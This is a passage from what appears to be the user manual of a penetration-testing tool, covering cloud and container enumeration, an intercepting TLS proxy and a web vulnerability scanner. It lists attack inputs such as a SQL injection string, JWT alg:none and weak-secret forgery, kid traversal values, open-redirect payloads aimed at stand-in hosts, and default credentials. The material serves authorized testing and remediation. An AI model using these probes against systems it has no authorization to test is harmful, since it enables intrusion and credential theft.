| Certificate expired | **High** | Expired certificates cause client trust failures and indicate neglected maintenance |

#### History View

The Hardening Monitor maintains a history of all delta events for the current session. Each delta report is timestamped and shows the exact changes detected. This history allows you to track how a host's security posture evolves over time.

#### Interval Selection Guidance

| Interval | Use Case |
| --- | --- |
| **5 minutes** | Active incident response — you are monitoring a host during a live attack or remediation |
| **15 minutes** | Active penetration test — you want to catch changes made by defenders in near-real-time |
| **1 hour** | Ongoing assessment — monitoring for changes during a multi-day engagement |
| **6 hours** | Maintenance window monitoring — catching changes made during scheduled maintenance |
| **24 hours** | Long-term posture monitoring — daily check that nothing has changed unexpectedly |

> **Worked example:** You set up 15-minute monitoring on a critical Windows server during an engagement. After 2 hours, a delta alert fires: port 3389 (RDP) has closed and a new banner appears on port 22 (SSH). The defenders noticed your RDP brute force attempts and switched to SSH. The monitor caught this change within 15 minutes of it happening.

### Security Analyzer

The Security Analyzer aggregates all available scan data for a host and produces a prioritized risk assessment.

1. Open the Host Details panel
2. Click **Analyze Risk** in the Actions section
3. The analyzer combines all available data
4. Results are displayed as a risk score (0-100) with a breakdown by category

#### Risk Scoring Algorithm

The overall risk score (0-100) is calculated from four weighted categories:

##### Network Exposure Score (25% weight)

Inputs:
- Total number of open ports (more ports = higher exposure)
- Presence of sensitive ports: SSH (22), RDP (3389), database ports (3306, 5432, 1433), SMB (445)
- Presence of management ports: SNMP (161), Telnet (23), unencrypted admin interfaces

A host with 3 open ports (80, 443, 22) scores lower than a host with 15 open ports including database and management services.

##### Patch Level Score (30% weight)

Inputs:
- Number of CVEs discovered via Nmap vuln scan
- CVSS scores of each CVE (aggregated — a single Critical CVE weighs more than five Low CVEs)
- Whether any CVE has a known public exploit (increases score significantly)

A host with zero CVEs scores 0 (best). A host with one Critical CVE with a public exploit scores near maximum.

##### Protocol Risk Score (20% weight)

Inputs:
- Cleartext protocols detected: FTP (21), Telnet (23), HTTP (80) without HTTPS, POP3 (110), IMAP (143)
- Each cleartext protocol adds to the score, weighted by the sensitivity of data it typically carries
- Telnet and FTP carry higher weight because they transmit credentials in plaintext

##### Configuration Risk Score (25% weight)

Inputs:
- Default credentials found by credential spray (maximum weight — this is an immediate compromise)
- Weak TLS configurations detected (deprecated protocols, weak ciphers)
- Missing security headers on HTTP services (detected by the Web App Scanner)
- World-readable SMB shares

#### Remediation Recommendations

Each category produces specific, actionable remediation steps:

```text
RISK ASSESSMENT — 192.168.1.50
Overall Score: 72/100 (HIGH)

Network Exposure: 18/25
  - 12 open ports detected (above threshold of 5)
  - RDP (3389) exposed — restrict to VPN or jump host
  - Telnet (23) open — replace with SSH

Patch Level: 24/30
  - CVE-2021-44228 (CVSS 10.0, Critical) — Log4Shell, public exploit available
  - CVE-2019-0708 (CVSS 9.8, Critical) — BlueKeep, public exploit available
  - Immediate patching required

Protocol Risk: 12/20
  - FTP (21) transmitting credentials in cleartext
  - HTTP (8080) admin panel without TLS
  - Migrate to SFTP and HTTPS

Configuration Risk: 18/25
  - Default credential admin:admin found on HTTP (8080)
  - SMB share 'Public' world-readable
  - Change default credentials immediately
```

> **Worked example:** You run the Security Analyzer on a Windows domain controller (`192.168.1.10`). The overall score is 85/100 (Critical). The breakdown reveals: 18 open ports (network exposure), two Critical CVEs including MS17-010 (patch level), Telnet and FTP still enabled (protocol risk), and the default SNMP community string `public` working (configuration risk). You prioritize: patch CVEs first, then disable Telnet/FTP, then change SNMP community strings.

---

## 18. Container & Cloud Enumeration

The Cloud Enum panel probes discovered hosts for exposed container orchestration and cloud infrastructure endpoints — some of the most high-severity misconfigurations found in modern environments.

#### Opening Cloud Enum

Click the **Cloud Enum** button in the top toolbar, or open Host Details and click **Cloud Enum** when container indicator ports (2375, 2379, 6443, 8443, 10250, etc.) are detected. These ports trigger a prominent **CRITICAL PORTS** badge on the host card.

#### Available Probes

Toggle individual probes before scanning:

| Probe | Default Port | What It Checks |
| --- | --- | --- |
| Docker Daemon | 2375 / 2376 | Unauthenticated Docker API (`/containers/json`, `/images/json`) |
| Kubernetes Kubelet | 10250 / 10255 | Pod listing, exec endpoints, anonymous access |
| Kubernetes API Server | 6443 / 8443 | Unauthenticated cluster access, RBAC bypass |
| etcd | 2379 | Key-value store access, Kubernetes secret exposure |
| AWS IMDSv1 | -- | `169.254.169.254` metadata endpoint |
| GCP Metadata | -- | `metadata.google.internal` compute metadata |
| Azure IMDS | -- | Azure instance metadata |
| Consul | 8500 | KV store access, service registry |
| Vault | 8200 | Secrets engine access |
| Prometheus | 9090 | Metrics endpoint, target enumeration |
| Grafana | 3000 | Default/no authentication check |
| Portainer | 9000 | Container management UI access |

#### What "Unauthenticated Access" Means for Each Probe

##### Docker Daemon (Port 2375)

The Docker API at `/containers/json` returns a JSON array of all running containers. Each entry includes:
- Container name and image
- Port mappings
- **Environment variables** — frequently contain database passwords, API keys, and secrets
- Mount points — reveals host filesystem paths mounted into containers

Unauthenticated Docker API access is equivalent to **root access on the host** — you can create a privileged container that mounts the host filesystem and execute arbitrary commands.

##### Kubernetes Kubelet (Port 10250)

The Kubelet API at `/pods` returns a list of all pods running on that node. The `/exec` endpoint allows executing arbitrary commands inside any running pod. Unauthenticated Kubelet access means:
- Full visibility into every pod's configuration, including secrets mounted as environment variables
- Remote Code Execution inside any pod via the exec endpoint
- Potential lateral movement to other cluster nodes

##### Kubernetes API Server (Port 6443)

Unauthenticated access to the Kubernetes API server gives cluster-admin level control. This enables:
- Listing all namespaces, pods, services, and secrets
- Creating new pods with host-mounted volumes (container escape)
- Reading Kubernetes Secrets (which contain TLS certificates, database credentials, API tokens)

##### etcd (Port 2379)

etcd is Kubernetes' backing store. All cluster state is stored here, including:
- Kubernetes Secrets — base64-encoded but not encrypted at rest by default. Decoded secrets contain database passwords, TLS keys, and service account tokens.
- Service configurations
- RBAC policies

##### Cloud Metadata (IMDSv1)

The Instance Metadata Service at `169.254.169.254` returns:
- **IAM role credentials** — temporary AWS access keys that can be used to access S3 buckets, EC2 instances, and other AWS services
- **Instance identity** — instance ID, region, availability zone
- **User-data scripts** — startup scripts that frequently contain hardcoded passwords, API keys, and database connection strings

> **Why this is critical:** SSRF vulnerabilities in web applications can be used to query this endpoint from the target's perspective, extracting IAM credentials that grant cloud-level access.

##### Consul (Port 8500)

The Consul KV store typically contains:
- Service configuration parameters
- Database connection strings
- Authentication tokens for other services
- TLS certificates and private keys

The Consul service catalog reveals every service in the infrastructure and its health status.

##### Vault (Port 8200)

HashiCorp Vault stores secrets. The `/v1/sys/health` endpoint reveals:
- **Sealed vs. unsealed status** — a sealed Vault cannot serve secrets, but knowing it exists is valuable
- **Initialization status** — an uninitialized Vault can be taken over by completing the initialization process
- **Cluster information** — cluster name, version

Unauthenticated access to Vault's secrets engines would be catastrophic, but this is rare. The more common finding is the health endpoint being publicly accessible, which leaks version and status information.

##### Prometheus (Port 9090)

The `/api/v1/targets` endpoint reveals **every monitored endpoint in the infrastructure** — a complete inventory of services, their URLs, ports, and health status. This is an attacker's roadmap to the entire environment.

##### Grafana (Port 3000)

Grafana's default credentials are `admin`/`admin`. If these work or if authentication is disabled:
- All dashboards are visible (may contain business metrics, infrastructure diagrams)
- Data source configurations are accessible (contain database connection strings)
- Alert configurations may reveal internal notification channels

##### Portainer (Port 9000)

Portainer provides a web UI for Docker management. Unauthenticated access means:
- Full Docker control — create, start, stop, delete containers
- Image management — pull any image, inspect layers
- Volume management — access persistent data
- Console access — open a shell in any running container

#### Running the Scan

1. Select target host and toggle desired probes
2. Set concurrency (default 5 parallel probes)
3. Click **Start Enumeration**

#### Reading Results

Findings are displayed as cards, color-coded by severity:

- **Critical** (red) — unauthenticated access to container/cloud management APIs (immediate RCE or secret extraction risk)
- **Warning** (yellow) — partially exposed endpoints, version disclosure
- **Info** (blue) — service detected but access denied

#### What to Do with a Critical Finding

1. **Stop testing immediately** — document the finding as-is. Do not attempt to extract actual secrets or data unless your Rules of Engagement explicitly permit it.
2. **Notify the client** — Critical container/cloud findings often represent immediate compromise risk to the entire environment.
3. **Document the exact endpoint** — include the URL, response headers, and a redacted snippet of the response body.
4. **Recommend remediation** — firewall rules, authentication enforcement, network segmentation.

Click any finding card to see the raw response, the specific endpoint that was probed, and remediation guidance. Export all findings as JSON using the **Export** button.

> **Worked example:** You discover a host at `192.168.1.200` with ports 2375 and 10250 open. Run Cloud Enum with Docker Daemon and Kubelet probes enabled. Results: Docker Daemon returns Critical (unauthenticated — 12 running containers visible), Kubelet returns Critical (anonymous access — 8 pods visible with environment variables containing `DB_PASSWORD`). You document both findings, note the specific secrets exposed (redacted), and immediately notify the client that their container infrastructure has no authentication. Remediation: bind Docker to unix socket only (not TCP), enable Kubelet authentication via client certificates.

---

## 19. Web Application Testing Workspace

NetSpecter includes a complete web application security testing workspace — accessible by clicking the **Web App** tab at the top of the main window. This switches the view from the Network workspace to the Web App workspace, which contains eight integrated tools.

> **Authorization Required:** Active scanning, active crawling, and Intruder attacks require the Pentest Consent Gate to be accepted.

### The Complete Web App Testing Workflow

The tools in the Web App workspace are designed to be used in a specific pipeline, where each tool feeds data into the next:

1. **Proxy** (19A) — intercept and record all browser traffic to understand the application
2. **Crawler / Sitemap** (19B) — build a complete map of the application's endpoints and parameters
3. **Scanner** (19C) — automatically test all discovered endpoints for vulnerabilities
4. **Repeater** (19D) — manually investigate and confirm scanner findings
5. **Intruder** (19E) — automate custom payload attacks against specific parameters
6. **Token Sequencer** (19F) — analyze session token randomness quality
7. **Encoder/Decoder** (19G) — transform payloads and decode responses
8. **Comparer** (19H) — compare responses side-by-side for subtle differences
9. **OAST** (19I) — confirm blind vulnerabilities via out-of-band callbacks
10. **WebSocket Fuzzer** (19J) — test WebSocket endpoints for injection vulnerabilities

Each tool can feed data to any other tool via right-click context menus or dedicated "Send to" buttons.

### Network and Web Workspace Pivot

The two workspaces share data bidirectionally:

- **Network to Web:** Clicking "Dir Fuzz" or "Send to Scanner" on an HTTP port in the Network workspace automatically switches to the Web App workspace with the target URL pre-loaded
- **Web to Network:** When the Scanner finds vulnerabilities on a host, a Web Vuln badge is injected onto the host's card in the Network workspace
- **Shared state:** The `webAppFindings[]` array in the application state accumulates findings from the Scanner and makes them available to both workspaces

### Consent Gate Reminder

The Pentest Consent Gate (Section 16) applies to active web testing tools as well. "Active" in the web context means: sending payloads that modify server state, testing for vulnerabilities by injecting attack strings, or brute-forcing credentials. Passive actions (proxy capture, sitemap building from proxy history, encoding/decoding) do not require consent.

---

### 19A. Intercepting HTTPS Proxy

The intercepting proxy is the foundation of the Web App workspace. It sits between your browser and the target application, giving you full visibility into every HTTP and HTTPS request.

#### How the Proxy Works

NetSpecter runs an HTTP proxy server on `127.0.0.1:8080` (port configurable in Settings). For HTTPS, it handles `CONNECT` tunnel requests and issues a dynamically generated TLS certificate for each hostname — signed by a locally-generated Certificate Authority (CA). This allows NetSpecter to decrypt and inspect all HTTPS traffic transparently.

##### How MITM TLS Works

When your browser sends an HTTPS request through the proxy:

1. The browser sends a `CONNECT target.com:443` request to the proxy
2. NetSpecter acknowledges the tunnel with `200 Connection Established`
3. The browser starts a TLS handshake through the tunnel
4. Instead of forwarding to the real server, NetSpecter:
   a. Generates a new TLS certificate for `target.com` using `node-forge`
   b. Signs this certificate with its own CA private key
   c. Presents this leaf certificate to the browser
5. Because you installed the NetSpecter CA certificate, your browser trusts this leaf certificate
6. The browser establishes TLS with the proxy (thinking it is `target.com`)
7. The proxy establishes a separate TLS connection to the real `target.com`
8. All traffic flows through the proxy in plaintext — fully visible and modifiable

#### Setup -- One-Time CA Certificate Installation

You only need to do this once per browser/system.

1. Open NetSpecter **Settings** then **Web App Proxy** section
2. Click **Export CA Certificate** — saves `netspectre-ca.pem` to your Downloads folder
3. Install the certificate in your browser's trust store:

> **Why you need to install the CA cert:** Without this step, your browser has no reason to trust the certificates NetSpecter generates. Every HTTPS site will show a certificate error (`NET::ERR_CERT_AUTHORITY_INVALID`), and many modern browsers will refuse to load the page entirely with HSTS-enabled sites. Installing the CA cert tells your browser: "I trust certificates signed by this CA" — which is exactly what NetSpecter's dynamically generated leaf certificates are.

##### Chrome / Edge (Windows)

1. Open `chrome://settings/security` (or `edge://settings/privacy`)
2. Click **Manage certificates** (opens the Windows Certificate Manager)
3. Select the **Trusted Root Certification Authorities** tab
4. Click **Import...**
5. Browse to `netspectre-ca.pem` and select it
6. Confirm the import warning
7. Restart the browser

##### Chrome / Edge (macOS)

1. Open **Keychain Access** (Spotlight search: "Keychain Access")
2. Select the **System** keychain
3. Drag `netspectre-ca.pem` into the keychain window
4. Double-click the imported certificate
5. Expand **Trust** and set "When using this certificate" to **Always Trust**
6. Close and authenticate with your password
7. Restart the browser

##### Firefox (All Platforms)

1. Open `about:preferences#privacy`
2. Scroll to **Certificates** and click **View Certificates...**
3. Select the **Authorities** tab
4. Click **Import...**
5. Browse to `netspectre-ca.pem`
6. Check **Trust this CA to identify websites**
7. Click **OK**
8. No browser restart needed

##### macOS System-Wide (for Safari)

```bash
sudo security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain netspectre-ca.pem
```

##### Linux (Debian/Ubuntu) System-Wide

```bash
sudo cp netspectre-ca.pem /usr/local/share/ca-certificates/netspectre-ca.crt
sudo update-ca-certificates
```

#### Browser Proxy Configuration

Configure your browser to route traffic through NetSpecter:

##### Chrome (All Platforms)

Chrome uses the system proxy settings by default:

- **Windows:** Settings then Network & Internet then Proxy then Manual proxy setup. Set Address: `127.0.0.1`, Port: `8080`. Enable "Use a proxy server."
- **macOS:** System Settings then Network then Wi-Fi then Details then Proxies. Enable "Web Proxy (HTTP)" and "Secure Web Proxy (HTTPS)". Set Server: `127.0.0.1`, Port: `8080`.
- **Linux:** System Settings then Network then Network Proxy. Set Manual. HTTP and HTTPS proxy: `127.0.0.1:8080`.

##### Firefox

Firefox has its own proxy settings independent of the system:

1. Open `about:preferences#general`
2. Scroll to **Network Settings** and click **Settings...**
3. Select **Manual proxy configuration**
4. Set HTTP Proxy: `127.0.0.1`, Port: `8080`
5. Check **Also use this proxy for HTTPS**
6. Click **OK**

> **Tip:** For dedicated testing, consider using a separate browser profile (or Firefox containers) configured for the proxy, so your regular browsing is unaffected.

#### Starting the Proxy

In the Web App workspace then **Proxy** tab:

1. Click **Start Proxy** — the status indicator turns green
2. Browse the target application in your browser
3. All requests appear in the **Request History** table in real time

#### Request History Table

Each row shows: timestamp, HTTP method, status code, hostname, path, response size, and duration. Click any row to open the full request/response viewer with syntax-highlighted headers and body.

##### What Every Column Means

| Column | Description |
| --- | --- |
| **#** | Sequential request number |
| **Time** | Timestamp when the request was received by the proxy |
| **Method** | HTTP method (GET, POST, PUT, DELETE, PATCH, OPTIONS, HEAD) |
| **Status** | HTTP response status code (color-coded: 2xx green, 3xx blue, 4xx orange, 5xx red) |
| **Host** | Target hostname |
| **Path** | URL path and query string |
| **Size** | Response body size in bytes |
| **Duration** | Round-trip time in milliseconds |
| **Type** | Content-Type of the response (HTML, JSON, CSS, JS, Image, etc.) |

##### WebSocket Capture

WebSocket Upgrade requests (`Connection: Upgrade, Upgrade: websocket`) appear in the history table with a special **WS** badge. The initial HTTP 101 Switching Protocols response is captured, showing the upgrade handshake. Subsequent WebSocket frames are not captured in the proxy history (use the WebSocket Fuzzer in Section 19J for WebSocket testing).

#### Filtering History

Use the filter bar above the table to narrow results by:

- **Hostname** — partial match, case-insensitive (e.g., `api.target` matches `api.target.com`)
- **HTTP method** — exact match (GET, POST, PUT, etc.)
- **Status code** — exact or range (e.g., `4xx` matches all 400-499 codes)
- **Path contains** — partial string match (e.g., `/api/` shows only API requests)
- **Response size range** — filter by minimum/maximum response size

> **Tip:** Filter by `Content-Type` to quickly find JSON API responses among the noise of CSS, JavaScript, and image requests.

#### Intercept Mode

Toggle **Intercept** to pause in-flight requests for manual inspection:

1. When a request is intercepted, it appears in the **Intercept** pane with the full raw request
2. Edit any part of the request (method, URL, headers, body)
3. Click **Forward** to send the modified request, or **Drop** to discard it

##### Intercept Mode Workflow

A step-by-step example of using intercept mode to test parameter manipulation:

1. Enable **Intercept** in the proxy panel
2. In your browser, navigate to the target application's login page
3. Enter credentials and click **Login**
4. The POST request is intercepted and shown in the Intercept pane
5. You can see the exact parameters being sent: `username=admin&password=test123`
6. Modify the request (e.g., add a SQL injection payload to the username field)
7. Click **Forward** to send the modified request
8. The response appears in the proxy history — check if the injection was successful
9. Toggle **Intercept** off when you want normal browsing to resume

#### HAR Export

Click **Export HAR** to save the full request history as a [HAR 1.2](http://www.softwareishard.com/blog/har-12-spec/) JSON file, compatible with browser DevTools, Postman, and security analysis tools.

##### What HAR 1.2 Format Contains

HAR (HTTP Archive) is a JSON-based format that includes:
- Full request headers and body for every captured request
- Full response headers and body
- Timing information (DNS lookup, connect, TLS handshake, request/response time)
- Cookie data

Tools that can open HAR files:
- **Browser DevTools** (Chrome/Firefox) — Network tab then Import
- **Postman** — Import then Upload Files
- **mitmproxy** — `mitmproxy -r file.har`
- **Burp Suite** — can import HAR via extensions
- **Charles Proxy** — File then Import

#### SQLite Persistence

Proxy history is stored in a SQLite database that persists automatically between app restarts. The database location varies by OS:

| OS | Database Path |
| --- | --- |
| **Windows** | `%APPDATA%\netspectre\proxy-history.db` |
| **macOS** | `~/Library/Application Support/netspectre/proxy-history.db` |
| **Linux** | `~/.config/netspectre/proxy-history.db` |

The database grows with captured traffic. To clear it, use the **Clear History** button in the proxy panel, which truncates all tables. For manual size management, you can delete the `.db` file while NetSpecter is not running.

> **Worked example:** You configure your browser to use the proxy and browse a target web application's login flow. The proxy history shows a POST to `/api/auth/login` with JSON body `{"email":"test@test.com","password":"password"}`. The response contains a `Set-Cookie: session=eyJ...` header with a JWT. You right-click this request and send it to Repeater to test for SQL injection in the email parameter, and send the JWT to the Token Sequencer to analyze its randomness.

---

### 19B. Web Crawling & Sitemap

The Sitemap tab builds a structured map of the target application's attack surface.

#### Passive Crawling (Always On)

Every request that flows through the proxy is automatically added to the sitemap. No additional action required. The sitemap tree populates as you browse normally.

##### Exactly What Data Is Extracted from Each Proxied Request

For every request that passes through the proxy, the passive crawler extracts:

- **URL** — full path including query parameters
- **HTTP method** — GET, POST, PUT, DELETE, etc.
- **Query parameters** — names and sample values from the URL query string
- **Body parameters** — names and sample values from POST bodies (JSON, form-encoded, multipart)
- **Content-Type** — used to classify the endpoint type
- **Response headers** — `Content-Type`, `X-Powered-By`, `Server` for technology fingerprinting
- **Links in response body** — `<a href>`, `<form action>`, `<script src>`, `<link href>` parsed from HTML responses

#### Active Crawling (Playwright)

Active crawling launches a headless Chromium browser to follow links, submit forms, and discover JavaScript-rendered endpoints that would be invisible to a proxy-only approach.

**Requirements:** Playwright / Chromium executable path configured in Settings.

1. In the Sitemap tab, click **Active Crawl**
2. Enter the seed URL (e.g., `https://target.com`)
3. Configure:
   - **Depth limit** — how many link-hops from the seed to follow (default 3)
   - **Page limit** — maximum pages to visit (default 100)
4. Click **Start Crawl** — discovered endpoints stream into the sitemap in real time
5. Click **Stop** at any time

##### Depth Limit vs. Page Limit

| Setting | What It Controls | When to Adjust |
| --- | --- | --- |
| **Depth limit** | How many levels deep the crawler follows links. Depth 1 = only links on the seed page. Depth 3 = follows links on pages found at depth 2. | Increase for deep applications with many nested pages. Decrease for broad applications with many top-level pages. |
| **Page limit** | Maximum total pages to visit regardless of depth. | Increase for large applications. Decrease when you only need a quick survey of the application structure. |

##### JavaScript-Rendered Content

Active crawling discovers endpoints that passive crawling misses:

- **Single Page Application (SPA) routes** — React/Angular/Vue applications that load content dynamically via JavaScript
- **Lazy-loaded API calls** — AJAX requests triggered by scrolling, clicking, or timer events
- **Form submissions** — the crawler fills and submits forms, discovering the endpoints that process form data
- **WebSocket upgrades** — connection attempts to `ws://` or `wss://` endpoints

#### Reading the Sitemap

The sitemap renders as a collapsible tree grouped by hostname and path depth. Each endpoint shows:

- **HTTP method badge** — color-coded (GET=blue, POST=green, PUT=orange, DELETE=red)
- **Endpoint type icon:**

| Icon | Type | Detection Signal |
| --- | --- | --- |
| **API** | REST API | JSON response `Content-Type`, path contains `/api/` |
| **GraphQL** | GraphQL endpoint | Path contains `/graphql` or response contains `data`/`errors` keys |
| **WS** | WebSocket | `Connection: Upgrade` header detected |
| **HTML** | Web page | HTML response `Content-Type` |
| **Asset** | Static asset | CSS, JS, image, font `Content-Type` |

- **Parameter count** — badge showing total discovered parameters (query + body). Higher parameter counts indicate richer attack surface.

#### Context Menu Actions

Right-click any endpoint in the sitemap to:

| Action | What It Does |
| --- | --- |
| **Send to Repeater** | Opens the endpoint as a pre-loaded Repeater request with all headers and parameters preserved |
| **Send to Scanner** | Adds the endpoint to the Scanner's target queue for automated vulnerability testing |
| **Send to Intruder** | Opens the endpoint as an Intruder template with parameters auto-detected as potential injection positions |
| **Copy URL** | Copies the full URL to clipboard |
| **Open in Browser** | Opens the URL in your system browser |

> **Worked example:** You browse a target application's login flow through the proxy. The passive crawler captures the login page (GET `/login`), the login submission (POST `/api/auth/login`), and the dashboard (GET `/dashboard`). You then run an active crawl from `https://target.com/`. The crawler discovers a hidden API endpoint at `/api/internal/users` that was called by a JavaScript file but never linked in the HTML. This endpoint has 3 parameters and is classified as a REST API. You right-click it and send it to the Scanner.

---

### 19C. Active Vulnerability Scanner

The Scanner automatically tests target endpoints for the OWASP Top 10 vulnerability categories.

#### Selecting a Target

In the Scanner tab, choose one of three target modes:

- **URL** — scan a single URL directly (enter it in the input field). Best for targeted testing of a specific endpoint you suspect is vulnerable.
- **Proxy History** — bulk scan all requests captured by the proxy (optionally filtered). Best for broad coverage of everything the application does.
- **Sitemap** — scan all endpoints in the current sitemap. Best for structured testing after a crawl has mapped the application.

#### Configuring Modules

Ten scan modules are available — each maps to an OWASP 2021 category. Toggle each on or off:

| Module | OWASP Category | What It Tests |
| --- | --- | --- |
| SQLi | A03 Injection | Time-based, error-based, boolean, UNION injection |
| XSS | A03 Injection | Reflected, DOM sink hints, encoded bypasses |
| SSRF | A10 SSRF | Cloud metadata endpoints, timing-based blind |
| XXE | A03 Injection | File read probes, parser delta detection |
| Command Injection | A03 Injection | Output reflection, time-based blind |
| Path Traversal | A01 Access Control | LFI via traversal sequences, null byte |
| CORS | A05 Misconfiguration | Arbitrary origin, null origin, subdomain bypass |
| HTTP Headers | A05 Misconfiguration | Missing security headers, version disclosure, cookie flags |
| Broken Auth | A07 Auth Failures | Rate-limit bypass, user enum, weak creds, JWT |
| Deserialization | A08 Integrity Failures | PHP, Java, Python, .NET, Node.js object patterns |
| GraphQL Security | A03 Injection / A05 Misconfig | Introspection, batch abuse, nested DoS, field suggestion leakage, SQLi via resolver args |
| JWT Attacks | A07 Auth Failures | alg:none bypass, weak HMAC brute-force, kid injection, jku/x5u spoofing, expired token |
| OAuth / OIDC | A07 Auth Failures / A05 Misconfig | Open redirect_uri, missing state, code leakage via Referer, token in URL, PKCE absence |
| Open Redirect | A01 Access Control | 8 bypass techniques, Location header + JS/meta body redirect detection |

#### Scanner Settings

- **Concurrency** — parallel requests per module (1-20, default 10). Use 10 for most targets. Reduce to 3-5 for fragile applications, legacy systems, or targets with aggressive rate limiting. Increase to 15-20 for robust targets in lab environments.
- **Timeout** — per-request timeout in milliseconds. Default 5000ms. Increase to 15000ms for slow applications or when testing time-based blind injection (which requires the scanner to wait for a deliberate delay in the response).
- **Follow redirects** — include or exclude redirect chains

#### Running the Scan

Click **Start Scan**. Findings stream into the results table in real time, sorted by severity.

##### Scan Progress

The progress bar represents: `(requests completed) / (total estimated requests)`. The total is estimated because some modules generate additional probes based on initial responses. The progress may exceed 100% in some cases.

#### Reading Findings

Each finding row shows: severity badge, module name, affected URL, and parameter. Click a row to expand the detail section:

| Field | Description |
| --- | --- |
| **Description** | What the vulnerability is and why it matters |
| **Evidence** | The specific request and response that triggered the finding (payload sent, response snippet) |
| **Remediation** | Specific fix guidance for this finding type |
| **References** | Links to OWASP, CVE, or CWE entries |

##### Finding Severity Levels

| Severity | Meaning | Examples |
| --- | --- | --- |
| **Critical** | Immediate compromise possible with no special conditions | SQL injection with data extraction, unauthenticated RCE, JWT alg:none bypass |
| **High** | Significant impact, exploitation likely | Reflected XSS, SSRF to cloud metadata, open redirect_uri in OAuth |
| **Medium** | Moderate impact or requires specific conditions | Missing security headers, CORS misconfiguration, deprecated TLS |
| **Low** | Minor impact, informational | Version disclosure, missing HSTS header |
| **Info** | No direct security impact but noteworthy | Server technology fingerprint, cookie without HttpOnly flag |

##### False Positive Handling

Not every finding is a real vulnerability. Common false positive indicators:

- **Time-based SQLi** with only a marginal delay difference (e.g., 5.2s vs 5.0s baseline) — may be network jitter
- **XSS** where the reflected content is inside a comment or attribute that cannot be escaped from
- **CORS** where the `Access-Control-Allow-Origin: *` is intentional for a public API
- **Missing headers** on static asset responses where headers are not security-relevant

To verify a finding, send it to the Repeater and manually reproduce the vulnerability.

#### New in Phase 7E -- Advanced Web Security Modules

The four modules below are automatically run alongside the existing ten when their respective toggles are enabled in the Scanner module selector.

##### GraphQL Security Scanner

This module first performs a heuristic check to identify whether the target endpoint is a GraphQL endpoint — looking for `/graphql`, `/gql`, or `/query` in the path, or a JSON response body containing `data` or `errors` keys. Non-GraphQL endpoints are skipped immediately.

When a GraphQL endpoint is confirmed, five probes run in sequence:

1. **Introspection probe** — sends `{__schema{types{name kind}}}` and checks if the server returns full type information. Introspection enabled in production leaks your entire API schema.
2. **Batch query probe** — sends an array of 100 `{__typename}` queries in a single HTTP request. If the server returns 100 results, batching is enabled, which allows rate-limit bypass and query amplification.
3. **Deeply nested query DoS** — sends a 12-level nested query. If the server takes over 5 seconds without returning HTTP 400, it lacks query depth limiting and is vulnerable to resource exhaustion.
4. **Field suggestion leakage** — intentionally misspells a field name (`nsProbeField_typo`). If the response body contains "Did you mean", the server is leaking schema hints even when introspection is disabled.
5. **SQL injection via resolver arguments** — embeds `1' OR '1'='1` in a GraphQL argument. If the response contains a SQL error pattern, the GraphQL layer is passing user input directly to SQL resolvers.
6. **OAST probe** (if OAST listener is running) — embeds the OAST callback URL in a resolver argument. A callback confirms blind server-side request forgery or command injection through the GraphQL layer.

##### JWT Attack Suite

This module activates on any request that carries a JWT — either in the `Authorization: Bearer <token>` header or in a cookie named `token`, `jwt`, `access_token`, `id_token`, or `auth`. Requests without a JWT are skipped.

The JWT is decoded (no signature verification) and the following attacks are attempted:

1. **alg:none bypass** — forges a new token with `"alg":"none"` and an empty signature segment. If the server returns a 200-class response or the same successful body, it is accepting unsigned tokens.
2. **Weak HMAC brute-force** — tests 15 common secrets (`secret`, `password`, `12345`, `key`, `jwt`, `admin`, etc.) by constructing a valid HMAC-SHA256 signature and replaying the request. The first working secret is reported with its value.
3. **kid path traversal / SQL injection** — if the original header contains a `kid` field, forges tokens using path traversal strings (`../../dev/null`) and SQL injection payloads as the `kid` value. Server acceptance of these is a critical finding.
4. **jku / x5u spoofing** (passive detection) — if the token header contains `jku` or `x5u` pointing to an external domain, this is flagged as high severity without active probing. These headers instruct the server to fetch the signing key from an attacker-controlled URL.
5. **Expired token acceptance** — if the `exp` claim is in the past, the original token is replayed as-is. Server acceptance means tokens are never validated for expiry.
6. **Privilege claim advisory** — if the payload contains `role`, `admin`, `scope`, or `groups` claims, an informational advisory is emitted recommending server-side authorization validation regardless of token claims.

All attack probes use the exact same request as the original (same URL, same headers, same body) — only the `Authorization` header or cookie value is replaced with the forged token.

##### OAuth / OIDC Misconfiguration Scanner

This module detects OAuth/OIDC endpoints by matching URL patterns: `/oauth`, `/authorize`, `/auth/`, `/connect/`, `/openid`, `/token`, `/callback`, or query parameters `response_type=`, `client_id=`, `redirect_uri=`. Non-OAuth endpoints are skipped.

Seven checks run passively (no active probing required for most) plus one active probe:

1. **Open redirect in redirect_uri** (active) — replaces the `redirect_uri` parameter with each of the configured test domains (e.g., `https://evil.com`) and checks whether the server redirects to it. This is the highest-severity finding (High) as it enables authorization code or token theft.
2. **Missing state parameter** (passive) — if a `response_type` parameter is present but `state` is absent, the flow is vulnerable to CSRF. The attacker can force a victim to authorize their own malicious client.
3. **Code leakage via Referer** (passive) — if the request URL contains an authorization `code` parameter AND a `Referer` header pointing to a different origin, the authorization code may be transmitted to third-party analytics or CDN servers before it is exchanged.
4. **Token in URL query parameter** (passive) — if `access_token` or `id_token` appear as URL query parameters, they will be logged in server access logs and browser history.
5. **Token in URL fragment** (passive) — if `access_token` or `id_token` appear in the URL fragment (`#`), this indicates implicit flow usage, which is deprecated in OAuth 2.1.
6. **Missing PKCE** (passive) — if `response_type=code` is present without `code_challenge`, the authorization code flow lacks PKCE protection, making it vulnerable to code interception attacks, especially for public (SPA / mobile) clients.
7. **Client secret in URL** (passive) — if `client_secret` appears as a URL query parameter, it will be leaked in logs, browser history, and Referer headers.
8. **Implicit flow** (passive) — if `response_type=token` or `response_type=id_token token`, the deprecated implicit flow is flagged.

##### Open Redirect Scanner

This module scans every URL parameter whose name suggests it holds a redirect destination. The recognized parameter names include: `redirect`, `redirect_url`, `redirect_uri`, `return`, `return_url`, `returnUrl`, `next`, `to`, `goto`, `url`, `link`, `target`, `dest`, `destination`, `continue`, `forward`, `rurl`, `ref`, `checkout_url`, `successUrl`, `cancelUrl`, `go`, `callback`, `r`. Additionally, any parameter whose current value begins with `http://` or `https://` is also tested (URL-value heuristic).

For each candidate parameter, 8 bypass technique probes are sent in sequence, stopping after the first confirmed hit per parameter:

| Probe | Payload Example | Bypass Technique |
| --- | --- | --- |
| 1 | `https://evil-redir.netspectre.test/phish` | Direct external URL |
| 2 | `//evil-redir.netspectre.test/phish` | Protocol-relative (double-slash) |
| 3 | `///evil-redir.netspectre.test/phish` | Triple-slash |
| 4 | `\evil-redir.netspectre.test/phish` | Backslash separator |
